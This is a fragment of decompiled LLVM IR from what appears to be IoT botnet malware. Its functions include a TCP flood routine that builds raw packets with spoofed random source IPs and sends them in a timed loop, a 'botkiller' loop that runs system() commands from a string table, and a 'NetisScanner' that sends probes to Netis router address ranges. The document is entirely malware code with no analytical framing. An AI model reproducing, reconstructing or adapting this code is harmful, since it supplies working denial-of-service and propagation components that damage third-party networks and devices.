  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_eb00 = load i8, i8* %v2_eac0, align 1
  %v4_eb00 = zext i8 %v3_eb00 to i32
  %v1_eb04 = or i32 %v4_eb00, 8
  store i32 %v1_eb04, i32* %r3.global-to-local, align 4
  %v1_eb08 = trunc i32 %v1_eb04 to i8
  store i8 %v1_eb08, i8* %v2_eac0, align 1
  br label %dec_label_pc_ec54

dec_label_pc_eb10:                                ; preds = %dec_label_pc_e9ac
  %v3_eb10 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_eb10, i32* %r3.global-to-local, align 4
  store i32 %v3_eb10, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b05c.404 to i32), i32* @r1, align 4
  %v2_eb1c = call i32 @__GI_strtok(i32 %v3_eb10, i32 ptrtoint (i32* @global_var_1b05c.404 to i32))
  store i32 %v2_eb1c, i32* %r3.global-to-local, align 4
  %v2_ec4c20 = icmp eq i32 %v2_eb1c, 0
  br i1 %v2_ec4c20, label %dec_label_pc_ec54, label %dec_label_pc_eb2c.lr.ph

dec_label_pc_eb2c.lr.ph:                          ; preds = %dec_label_pc_eb10
  %v1_eb4c = add i32 %v3_e9e0, 33
  %v2_eb4c = inttoptr i32 %v1_eb4c to i8*
  br label %dec_label_pc_eb2c

dec_label_pc_eb2c:                                ; preds = %dec_label_pc_eb2c.lr.ph, %dec_label_pc_ec34
  %storemerge1421 = phi i32 [ %v2_eb1c, %dec_label_pc_eb2c.lr.ph ], [ %v2_ec3c, %dec_label_pc_ec34 ]
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b060.406 to i32), i32* @r1, align 4
  %v3_eb38 = inttoptr i32 %storemerge1421 to i8*
  %v4_eb38 = call i32 @__GI_strcoll(i8* %v3_eb38, i32 ptrtoint ([4 x i8]* @global_var_1b060.406 to i32))
  store i32 %v4_eb38, i32* %r3.global-to-local, align 4
  %v2_eb40 = icmp eq i32 %v4_eb38, 0
  br i1 %v2_eb40, label %dec_label_pc_eb48, label %dec_label_pc_eb5c

dec_label_pc_eb48:                                ; preds = %dec_label_pc_eb2c
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_eb4c = load i8, i8* %v2_eb4c, align 1
  %v4_eb4c = zext i8 %v3_eb4c to i32
  %v1_eb50 = or i32 %v4_eb4c, 2
  store i32 %v1_eb50, i32* %r3.global-to-local, align 4
  %v1_eb54 = trunc i32 %v1_eb50 to i8
  store i8 %v1_eb54, i8* %v2_eb4c, align 1
  br label %dec_label_pc_ec34

dec_label_pc_eb5c:                                ; preds = %dec_label_pc_eb2c
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b064.408 to i32), i32* @r1, align 4
  %v4_eb68 = call i32 @__GI_strcoll(i8* %v3_eb38, i32 ptrtoint ([4 x i8]* @global_var_1b064.408 to i32))
  store i32 %v4_eb68, i32* %r3.global-to-local, align 4
  %v2_eb70 = icmp eq i32 %v4_eb68, 0
  br i1 %v2_eb70, label %dec_label_pc_eb78, label %dec_label_pc_eb8c

dec_label_pc_eb78:                                ; preds = %dec_label_pc_eb5c
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_eb7c = load i8, i8* %v2_eb4c, align 1
  %v4_eb7c = zext i8 %v3_eb7c to i32
  %v1_eb80 = or i32 %v4_eb7c, 4
  store i32 %v1_eb80, i32* %r3.global-to-local, align 4
  %v1_eb84 = trunc i32 %v1_eb80 to i8
  store i8 %v1_eb84, i8* %v2_eb4c, align 1
  br label %dec_label_pc_ec34

dec_label_pc_eb8c:                                ; preds = %dec_label_pc_eb5c
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b068.410 to i32), i32* @r1, align 4
  %v4_eb98 = call i32 @__GI_strcoll(i8* %v3_eb38, i32 ptrtoint ([4 x i8]* @global_var_1b068.410 to i32))
  store i32 %v4_eb98, i32* %r3.global-to-local, align 4
  %v2_eba0 = icmp eq i32 %v4_eb98, 0
  br i1 %v2_eba0, label %dec_label_pc_eba8, label %dec_label_pc_ebbc

dec_label_pc_eba8:                                ; preds = %dec_label_pc_eb8c
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_ebac = load i8, i8* %v2_eb4c, align 1
  %v4_ebac = zext i8 %v3_ebac to i32
  %v1_ebb0 = or i32 %v4_ebac, 1
  store i32 %v1_ebb0, i32* %r3.global-to-local, align 4
  %v1_ebb4 = trunc i32 %v1_ebb0 to i8
  store i8 %v1_ebb4, i8* %v2_eb4c, align 1
  br label %dec_label_pc_ec34

dec_label_pc_ebbc:                                ; preds = %dec_label_pc_eb8c
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b06c.412 to i32), i32* @r1, align 4
  %v4_ebc8 = call i32 @__GI_strcoll(i8* %v3_eb38, i32 ptrtoint ([4 x i8]* @global_var_1b06c.412 to i32))
  store i32 %v4_ebc8, i32* %r3.global-to-local, align 4
  %v2_ebd0 = icmp eq i32 %v4_ebc8, 0
  br i1 %v2_ebd0, label %dec_label_pc_ebd8, label %dec_label_pc_ebec

dec_label_pc_ebd8:                                ; preds = %dec_label_pc_ebbc
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_ebdc = load i8, i8* %v2_eb4c, align 1
  %v4_ebdc = zext i8 %v3_ebdc to i32
  %v1_ebe0 = or i32 %v4_ebdc, 16
  store i32 %v1_ebe0, i32* %r3.global-to-local, align 4
  %v1_ebe4 = trunc i32 %v1_ebe0 to i8
  store i8 %v1_ebe4, i8* %v2_eb4c, align 1
  br label %dec_label_pc_ec34

dec_label_pc_ebec:                                ; preds = %dec_label_pc_ebbc
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b070.414 to i32), i32* @r1, align 4
  %v4_ebf8 = call i32 @__GI_strcoll(i8* %v3_eb38, i32 ptrtoint ([4 x i8]* @global_var_1b070.414 to i32))
  store i32 %v4_ebf8, i32* %r3.global-to-local, align 4
  %v2_ec00 = icmp eq i32 %v4_ebf8, 0
  br i1 %v2_ec00, label %dec_label_pc_ec08, label %dec_label_pc_ec1c

dec_label_pc_ec08:                                ; preds = %dec_label_pc_ebec
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_ec0c = load i8, i8* %v2_eb4c, align 1
  %v4_ec0c = zext i8 %v3_ec0c to i32
  %v1_ec10 = or i32 %v4_ec0c, 8
  store i32 %v1_ec10, i32* %r3.global-to-local, align 4
  %v1_ec14 = trunc i32 %v1_ec10 to i8
  store i8 %v1_ec14, i8* %v2_eb4c, align 1
  br label %dec_label_pc_ec34

dec_label_pc_ec1c:                                ; preds = %dec_label_pc_ebec
  %v2_ec20 = load i32, i32* @global_var_2c908.54, align 4
  store i32 %v2_ec20, i32* %r3.global-to-local, align 4
  store i32 %storemerge1421, i32* @r2, align 4
  %v3_ec30 = call i32 @sockprintf(i32 %v2_ec20, i32 ptrtoint ([18 x i8]* @global_var_1b074.416 to i32))
  br label %dec_label_pc_ec34

dec_label_pc_ec34:                                ; preds = %dec_label_pc_ec08, %dec_label_pc_ebd8, %dec_label_pc_eba8, %dec_label_pc_eb78, %dec_label_pc_eb48, %dec_label_pc_ec1c
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b05c.404 to i32), i32* @r1, align 4
  %v2_ec3c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1b05c.404 to i32))
  store i32 %v2_ec3c, i32* %r3.global-to-local, align 4
  %v2_ec4c = icmp eq i32 %v2_ec3c, 0
  br i1 %v2_ec4c, label %dec_label_pc_ec54, label %dec_label_pc_eb2c

dec_label_pc_ec54:                                ; preds = %dec_label_pc_ec34, %dec_label_pc_eb10, %dec_label_pc_eabc
  %v0_ec54 = call i32 @rand_cmwc()
  %v3_ec60 = urem i32 %v0_ec54, 65536
  store i32 %v3_ec60, i32* %r3.global-to-local, align 4
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v1_ec68 = trunc i32 %v0_ec54 to i8
  %v3_ec68 = add i32 %v3_e9e0, 34
  %v4_ec68 = inttoptr i32 %v3_ec68 to i8*
  store i8 %v1_ec68, i8* %v4_ec68, align 2
  %v0_ec6c = load i32, i32* %r3.global-to-local, align 4
  %v3_ec6c25 = udiv i32 %v0_ec6c, 256
  %v1_ec70 = trunc i32 %v3_ec6c25 to i8
  %v2_ec70 = load i32, i32* %r2.global-to-local, align 4
  %v3_ec70 = add i32 %v2_ec70, 15
  %v4_ec70 = inttoptr i32 %v3_ec70 to i8*
  store i8 %v1_ec70, i8* %v4_ec70, align 1
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ec7c = add i32 %v3_e9e0, 36
  %v4_ec7c = inttoptr i32 %v3_ec7c to i8*
  store i8 0, i8* %v4_ec7c, align 4
  %v0_ec80 = load i32, i32* %r3.global-to-local, align 4
  %v1_ec80 = trunc i32 %v0_ec80 to i8
  %v2_ec80 = load i32, i32* %r2.global-to-local, align 4
  %v3_ec80 = add i32 %v2_ec80, 17
  %v4_ec80 = inttoptr i32 %v3_ec80 to i8*
  store i8 %v1_ec80, i8* %v4_ec80, align 1
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ec8c = add i32 %v3_e9e0, 38
  %v4_ec8c = inttoptr i32 %v3_ec8c to i8*
  store i8 0, i8* %v4_ec8c, align 2
  %v0_ec90 = load i32, i32* %r3.global-to-local, align 4
  %v1_ec90 = trunc i32 %v0_ec90 to i8
  %v2_ec90 = load i32, i32* %r2.global-to-local, align 4
  %v3_ec90 = add i32 %v2_ec90, 19
  %v4_ec90 = inttoptr i32 %v3_ec90 to i8*
  store i8 %v1_ec90, i8* %v4_ec90, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_e86c, label %dec_label_pc_eca0, label %dec_label_pc_ecb8

dec_label_pc_eca0:                                ; preds = %dec_label_pc_ec54
  %v0_eca0 = call i32 @rand_cmwc()
  %v3_eca8 = mul i32 %v0_eca0, 65536
  store i32 %v3_eca8, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_eca0 to i8
  br label %dec_label_pc_ecd4

dec_label_pc_ecb8:                                ; preds = %dec_label_pc_ec54
  %v3_ecc0 = urem i32 %arg2, 65536
  store i32 %v3_ecc0, i32* %r3.global-to-local, align 4
  %v1_ecc8 = call i32 @htons(i32 %v3_ecc0)
  %extract.t71 = trunc i32 %v1_ecc8 to i8
  br label %dec_label_pc_ecd4

dec_label_pc_ecd4:                                ; preds = %dec_label_pc_eca0, %dec_label_pc_ecb8
  %v0_eca0.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_eca0 ], [ %extract.t71, %dec_label_pc_ecb8 ]
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v4_ecd8 = sext i8 %v0_eca0.sink.off0 to i32
  %v3_ecdc = add i32 %v3_e9e0, 22
  %v4_ecdc = inttoptr i32 %v3_ecdc to i8*
  store i8 %v0_eca0.sink.off0, i8* %v4_ecdc, align 2
  %v3_ece4 = sdiv i32 %v4_ecd8, 256
  %v4_ece4 = trunc i32 %v3_ece4 to i8
  store i32 %v3_ece4, i32* %r3.global-to-local, align 4
  %v4_ece8 = add i32 %v3_e9e0, 23
  %v5_ece8 = inttoptr i32 %v4_ece8 to i8*
  store i8 %v4_ece4, i8* %v5_ece8, align 1
  %v5_ecf4 = call i32 @tcpcsum(i32 %v3_e9e0, i32 %v1_ea00, i32 %v1_ea00, i32 %v3_ece4)
  %sext = mul i32 %v5_ecf4, 16777216
  %v1_ecf8 = sdiv i32 %sext, 16777216
  store i32 %v1_ecf8, i32* %r3.global-to-local, align 4
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v1_ed00 = trunc i32 %v1_ecf8 to i8
  store i8 %v1_ed00, i8* %v4_ec7c, align 4
  %v0_ed04 = load i32, i32* %r3.global-to-local, align 4
  %v3_ed0428 = udiv i32 %v0_ed04, 256
  %v1_ed08 = trunc i32 %v3_ed0428 to i8
  %v2_ed08 = load i32, i32* %r2.global-to-local, align 4
  %v3_ed08 = add i32 %v2_ed08, 17
  %v4_ed08 = inttoptr i32 %v3_ed08 to i8*
  store i8 %v1_ed08, i8* %v4_ed08, align 1
  %v1_ed18 = or i32 %v3_e9e0, 2
  store i32 %v1_ed18, i32* %r3.global-to-local, align 4
  %v1_ed1c = inttoptr i32 %v1_ed18 to i8*
  %v2_ed1c = load i8, i8* %v1_ed1c, align 2
  %v3_ed1c = zext i8 %v2_ed1c to i32
  store i32 %v3_ed1c, i32* %r2.global-to-local, align 4
  %v1_ed20 = or i32 %v1_e9dc, 3
  %v2_ed20 = inttoptr i32 %v1_ed20 to i8*
  %v3_ed20 = load i8, i8* %v2_ed20, align 1
  %v4_ed20 = zext i8 %v3_ed20 to i32
  %v4_ed24 = mul nuw nsw i32 %v4_ed20, 256
  %v5_ed24 = or i32 %v4_ed24, %v3_ed1c
  store i32 %v5_ed24, i32* %r3.global-to-local, align 4
  %v3_ed30 = call i32 @csum(i8* %v4_ea3c, i32 %v5_ed24)
  %sext4 = mul i32 %v3_ed30, 16777216
  %v1_ed34 = sdiv i32 %sext4, 16777216
  store i32 %v1_ed34, i32* %r3.global-to-local, align 4
  store i32 %v3_e9e0, i32* %r2.global-to-local, align 4
  %v1_ed3c = trunc i32 %v1_ed34 to i8
  %v3_ed3c = add i32 %v3_e9e0, 10
  %v4_ed3c = inttoptr i32 %v3_ed3c to i8*
  store i8 %v1_ed3c, i8* %v4_ed3c, align 2
  %v0_ed40 = load i32, i32* %r3.global-to-local, align 4
  %v3_ed40 = sdiv i32 %v0_ed40, 256
  store i32 %v3_ed40, i32* %r3.global-to-local, align 4
  %v1_ed44 = trunc i32 %v3_ed40 to i8
  %v2_ed44 = load i32, i32* %r2.global-to-local, align 4
  %v3_ed44 = add i32 %v2_ed44, 11
  %v4_ed44 = inttoptr i32 %v3_ed44 to i8*
  store i8 %v1_ed44, i8* %v4_ed44, align 1
  %v2_ed4c = call i32 @__GI_time(i32* null)
  %v2_ed58 = add i32 %v2_ed4c, %arg3
  store i32 %v2_ed58, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_edb0 = add i32 %v3_e9e0, 12
  %v3_edb0 = inttoptr i32 %v2_edb0 to i32*
  %v3_edc8 = add i32 %v3_e9e0, 4
  %v4_edc8 = inttoptr i32 %v3_edc8 to i8*
  %v4_ee10 = add i32 %v3_e9e0, 37
  %v5_ee10 = inttoptr i32 %v4_ee10 to i8*
  br label %dec_label_pc_ed6c

dec_label_pc_ed6c:                                ; preds = %dec_label_pc_eea4, %dec_label_pc_ee98, %dec_label_pc_ecd4
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_ecd4 ], [ 0, %dec_label_pc_ee98 ], [ %v1_eea8, %dec_label_pc_eea4 ]
  store i32 %v3_e9e0, i32* %r2.global-to-local, align 4
  %v1_ed74 = load i32, i32* @sp, align 4
  %v2_ed74 = inttoptr i32 %v1_ed74 to i32*
  store i32 %v2_e8dc, i32* %v2_ed74, align 4
  %v1_ed7c = load i32, i32* @sp, align 4
  %v2_ed7c = add i32 %v1_ed7c, 4
  %v3_ed7c = inttoptr i32 %v2_ed7c to i32*
  store i32 16, i32* %v3_ed7c, align 4
  %v0_ed84 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_e9b0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_ed90 = inttoptr i32 %v0_ed84 to i32*
  %v7_ed90 = call i32 @__libc_sendto(i32 %v0_e900, i32* %v6_ed90, i32 %v1_e9b0, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_ed98 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_ed98, i32* %r3.global-to-local, align 4
  %v1_eda4 = call i32 @htonl(i32 %v1_ed98)
  store i32 %v1_eda4, i32* %r2.global-to-local, align 4
  store i32 %v3_e9e0, i32* %r3.global-to-local, align 4
  store i32 %v1_eda4, i32* %v3_edb0, align 4
  %v0_edb4 = call i32 @rand_cmwc()
  %v3_edc0 = urem i32 %v0_edb4, 65536
  store i32 %v3_edc0, i32* %r3.global-to-local, align 4
  store i32 %v3_e9e0, i32* %r2.global-to-local, align 4
  %v1_edc8 = trunc i32 %v0_edb4 to i8
  store i8 %v1_edc8, i8* %v4_edc8, align 4
  %v0_edcc = load i32, i32* %r3.global-to-local, align 4
  %v3_edcc = sdiv i32 %v0_edcc, 256
  store i32 %v3_edcc, i32* %r3.global-to-local, align 4
  %v1_edd0 = trunc i32 %v3_edcc to i8
  %v2_edd0 = load i32, i32* %r2.global-to-local, align 4
  %v3_edd0 = add i32 %v2_edd0, 5
  %v4_edd0 = inttoptr i32 %v3_edd0 to i8*
  store i8 %v1_edd0, i8* %v4_edd0, align 1
  %v0_edd4 = call i32 @rand_cmwc()
  store i32 %v0_edd4, i32* %r2.global-to-local, align 4
  store i32 %v1_ea00, i32* %r3.global-to-local, align 4
  store i32 %v0_edd4, i32* %v3_ea6c, align 4
  %v0_ede4 = call i32 @rand_cmwc()
  %v3_edf0 = urem i32 %v0_ede4, 65536
  store i32 %v3_edf0, i32* %r3.global-to-local, align 4
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v1_edf8 = trunc i32 %v0_ede4 to i8
  store i8 %v1_edf8, i8* %v5_ea04, align 4
  %v0_edfc = load i32, i32* %r3.global-to-local, align 4
  %v3_edfc29 = udiv i32 %v0_edfc, 256
  %v1_ee00 = trunc i32 %v3_edfc29 to i8
  %v2_ee00 = load i32, i32* %r2.global-to-local, align 4
  %v3_ee00 = add i32 %v2_ee00, 1
  %v4_ee00 = inttoptr i32 %v3_ee00 to i8*
  store i8 %v1_ee00, i8* %v4_ee00, align 1
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v4_ec7c, align 4
  store i8 0, i8* %v5_ee10, align 1
  %v5_ee1c = call i32 @tcpcsum(i32 %v3_e9e0, i32 %v1_ea00, i32 %v1_ea00, i32 0)
  %sext5 = mul i32 %v5_ee1c, 16777216
  %v1_ee20 = sdiv i32 %sext5, 16777216
  store i32 %v1_ee20, i32* %r3.global-to-local, align 4
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v1_ee28 = trunc i32 %v1_ee20 to i8
  store i8 %v1_ee28, i8* %v4_ec7c, align 4
  %v0_ee2c = load i32, i32* %r3.global-to-local, align 4
  %v3_ee2c30 = udiv i32 %v0_ee2c, 256
  %v1_ee30 = trunc i32 %v3_ee2c30 to i8
  %v2_ee30 = load i32, i32* %r2.global-to-local, align 4
  %v3_ee30 = add i32 %v2_ee30, 17
  %v4_ee30 = inttoptr i32 %v3_ee30 to i8*
  store i8 %v1_ee30, i8* %v4_ee30, align 1
  store i32 %v1_ed18, i32* %r3.global-to-local, align 4
  %v2_ee44 = load i8, i8* %v1_ed1c, align 2
  %v3_ee44 = zext i8 %v2_ee44 to i32
  store i32 %v3_ee44, i32* %r2.global-to-local, align 4
  %v3_ee48 = load i8, i8* %v2_ed20, align 1
  %v4_ee48 = zext i8 %v3_ee48 to i32
  %v4_ee4c = mul nuw nsw i32 %v4_ee48, 256
  %v5_ee4c = or i32 %v4_ee4c, %v3_ee44
  store i32 %v5_ee4c, i32* %r3.global-to-local, align 4
  %v3_ee58 = call i32 @csum(i8* %v4_ea3c, i32 %v5_ee4c)
  %sext6 = mul i32 %v3_ee58, 16777216
  %v1_ee5c = sdiv i32 %sext6, 16777216
  store i32 %v1_ee5c, i32* %r3.global-to-local, align 4
  store i32 %v3_e9e0, i32* %r2.global-to-local, align 4
  %v1_ee64 = trunc i32 %v1_ee5c to i8
  store i8 %v1_ee64, i8* %v4_ed3c, align 2
  %v0_ee68 = load i32, i32* %r3.global-to-local, align 4
  %v3_ee6831 = udiv i32 %v0_ee68, 256
  %v1_ee6c = trunc i32 %v3_ee6831 to i8
  %v2_ee6c = load i32, i32* %r2.global-to-local, align 4
  %v3_ee6c = add i32 %v2_ee6c, 11
  %v4_ee6c = inttoptr i32 %v3_ee6c to i8*
  store i8 %v1_ee6c, i8* %v4_ee6c, align 1
  store i32 %stack_var_-88.0, i32* %r3.global-to-local, align 4
  %v9_ee78 = icmp eq i32 %stack_var_-88.0, %arg7
  br i1 %v9_ee78, label %dec_label_pc_ee80, label %dec_label_pc_eea4

dec_label_pc_ee80:                                ; preds = %dec_label_pc_ed6c
  %v2_ee84 = call i32 @__GI_time(i32* null)
  store i32 %v2_ee84, i32* %r2.global-to-local, align 4
  store i32 %v2_ed58, i32* %r3.global-to-local, align 4
  %v8_ee94 = icmp sgt i32 %v2_ee84, %v2_ed58
  br i1 %v8_ee94, label %dec_label_pc_eeb4, label %dec_label_pc_ee98

dec_label_pc_ee98:                                ; preds = %dec_label_pc_ee80
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ed6c

dec_label_pc_eea4:                                ; preds = %dec_label_pc_ed6c
  %v1_eea8 = add i32 %stack_var_-88.0, 1
  store i32 %v1_eea8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ed6c

dec_label_pc_eeb4:                                ; preds = %dec_label_pc_ee80, %dec_label_pc_e8b8, %dec_label_pc_e964, %dec_label_pc_e918
  %v12_eebc = phi i32 [ %v3_e8c8, %dec_label_pc_e8b8 ], [ %v3_e974, %dec_label_pc_e964 ], [ %v3_e928, %dec_label_pc_e918 ], [ %v2_ee84, %dec_label_pc_ee80 ]
  store i32 %v3_e82c, i32* @r4, align 4
  store i32 %v6_e82c, i32* @fp, align 4
  ret i32 %v12_eebc

; uselistorder directives
  uselistorder i32 %v1_eea8, { 1, 0 }
  uselistorder i32 %v1_ee5c, { 1, 0 }
  uselistorder i32 %v1_ee20, { 1, 0 }
  uselistorder i32 %v0_ede4, { 1, 0 }
  uselistorder i32 %v3_edcc, { 1, 0 }
  uselistorder i32 %v0_edb4, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 0, 2, 1 }
  uselistorder i32 %v2_ed58, { 1, 0, 2 }
  uselistorder i32 %v3_ed40, { 1, 0 }
  uselistorder i32 %v1_ed34, { 1, 0 }
  uselistorder i32 %v1_ed18, { 0, 2, 1 }
  uselistorder i32 %v1_ecf8, { 1, 0 }
  uselistorder i32 %v3_ece4, { 2, 0, 1 }
  uselistorder i8 %v0_eca0.sink.off0, { 1, 0 }
  uselistorder i32 %v3_ecc0, { 1, 0 }
  uselistorder i32 %v0_eca0, { 1, 0 }
  uselistorder i32 %v0_ec54, { 1, 0 }
  uselistorder i32 %v2_ec3c, { 1, 0, 2 }
  uselistorder i32 %storemerge1421, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_eb4c, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i8* %v2_eac0, { 1, 5, 2, 6, 3, 7, 4, 8, 0, 9 }
  uselistorder i32 %v3_ea58, { 1, 0 }
  uselistorder i32 %v0_ea40, { 1, 0 }
  uselistorder i32 %v1_ea00, { 5, 7, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 22, 21, 20, 19, 18, 0, 1, 2, 3, 4, 23, 24, 25, 26 }
  uselistorder i32 %v3_e9e0, { 12, 11, 10, 8, 6, 23, 9, 7, 4, 5, 22, 3, 21, 20, 19, 18, 17, 16, 24, 15, 14, 13, 2, 1, 0 }
  uselistorder i32 %v1_e9b0, { 1, 0 }
  uselistorder i32 %v3_e89c, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 6, 7, 4, 5, 11, 12, 8, 9, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 24, 25, 22, 23, 27, 28, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 54, 38, 39, 41, 40, 42, 44, 43, 45, 47, 46, 48, 50, 49, 51, 53, 52, 83, 55, 56, 57, 58, 59, 60, 63, 61, 62, 64, 65, 66, 67, 69, 68, 70, 71, 72, 74, 73, 75, 76, 77, 79, 78, 80, 81, 82, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_eeb4, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_ecd4, { 1, 0 }
  uselistorder label %dec_label_pc_ec34, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_eb2c, { 1, 0 }
  uselistorder label %dec_label_pc_e9ac, { 1, 0 }
  uselistorder label %dec_label_pc_e8b8, { 1, 0 }
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i8*, align 4
  %v2_eef8 = ptrtoint i8** %stack_var_-100 to i32
  %v2_ef44 = bitcast i8** %stack_var_-100 to i8*
  br label %dec_label_pc_eefc

dec_label_pc_eefc:                                ; preds = %dec_label_pc_efd4, %entry
  br label %dec_label_pc_ef08

dec_label_pc_ef08:                                ; preds = %dec_label_pc_eefc, %dec_label_pc_ef08
  %storemerge45 = phi i32 [ 0, %dec_label_pc_eefc ], [ %v1_efc0, %dec_label_pc_ef08 ]
  store i8* inttoptr (i32 1818848112 to i8*), i8** %stack_var_-100, align 4
  %v4_ef34 = mul nuw nsw i32 %storemerge45, 4
  %v5_ef34 = add i32 %v4_ef34, ptrtoint ([87 x i8*]* @global_var_2c328.505 to i32)
  %v6_ef34 = inttoptr i32 %v5_ef34 to i32*
  %v7_ef34 = load i32, i32* %v6_ef34, align 4
  store i32 %v7_ef34, i32* @r1, align 4
  %v3_ef44 = call i32 @strcat(i8* %v2_ef44, i32 %v7_ef34)
  %v1_ef50 = call i32 @__libc_system(i32 %v2_eef8)
  store i8* inttoptr (i32 1818848112 to i8*), i8** %stack_var_-100, align 4
  %v7_ef8c = load i32, i32* %v6_ef34, align 4
  store i32 %v7_ef8c, i32* @r1, align 4
  %v3_ef9c = call i32 @strcat(i8* %v2_ef44, i32 %v7_ef8c)
  store i32 ptrtoint (i32* @global_var_1b0a0.511 to i32), i32* @r1, align 4
  %v3_efac = call i32 @strcat(i8* %v2_ef44, i32 ptrtoint (i32* @global_var_1b0a0.511 to i32))
  %v1_efb8 = call i32 @__libc_system(i32 %v2_eef8)
  %v1_efc0 = add nuw nsw i32 %storemerge45, 1
  %v7_efd0 = icmp slt i32 %v1_efc0, 9
  br i1 %v7_efd0, label %dec_label_pc_ef08, label %dec_label_pc_efd4

dec_label_pc_efd4:                                ; preds = %dec_label_pc_ef08
  %v1_efd8 = call i32 @sleep(i32 5)
  br label %dec_label_pc_eefc

; uselistorder directives
  uselistorder i32 %storemerge45, { 1, 0 }
  uselistorder i8** %stack_var_-100, { 3, 2, 0, 1 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 50, { 0, 2, 1 }
  uselistorder i32 49, { 0, 1, 3, 2 }
  uselistorder [3 x i8]* @global_var_19ed8.41, { 1, 0 }
  uselistorder label %dec_label_pc_ef08, { 1, 0 }
}

define i32 @NetisScanner(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 61436, i32* %stack_var_-4, align 4
  %v2_eff8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_eff8, i32* @fp, align 4
  %v2_f058 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_f000

dec_label_pc_f000:                                ; preds = %dec_label_pc_f000, %entry
  %v0_f00c = call i32 @socket()
  store i32 2, i32* %stack_var_-48, align 4
  %v1_f030 = call i32 @htons(i32 add (i32 ptrtoint (i32* @global_var_d100.512 to i32), i32 -91))
  %v0_f044 = call i32 @NetisRanges()
  %v3_f084 = call i32 @strlen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1b0a4.514, i32 0, i32 0))
  %v8_f0a8 = call i32 @__libc_sendto(i32 %v0_f00c, i32* bitcast ([16 x i8]* @global_var_1b0a4.514 to i32*), i32 %v3_f084, i32 0, i32 %v2_f058, i32 16)
